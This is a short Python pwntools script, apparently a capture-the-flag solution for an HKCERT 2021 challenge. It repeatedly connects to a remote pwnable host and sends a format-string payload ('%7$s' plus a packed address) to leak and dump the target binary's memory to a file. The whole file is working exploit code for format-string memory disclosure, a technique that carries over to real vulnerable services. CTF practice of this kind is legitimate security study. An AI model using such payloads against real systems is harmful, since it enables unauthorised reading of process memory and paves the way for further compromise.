from pwn import *

#target.sendline("A"*8 + ".%6$lx")	# AAAAAAAA.4141414141414141 is not the correct answer.

context.log_level = "ERROR"

elf = open("leaked_binary", "wb")

elf_base = 0x400000
#i = 0
while elf_base < 0x404000:
#	i = i+1
	print hex(elf_base),
	target = remote("chalp.hkcert21.pwnable.hk", 28132)
	payload = "%7$sxxxx" + p64(elf_base)
	target.sendline(payload)

	leak = target.recvuntil("xxxx", drop=True)
	if len(leak) == 0:
		leak = "\x00"
	elf.write(leak)
	elf_base = elf_base + len(leak)
	#print(leak)
	target.close()



#target.interactive()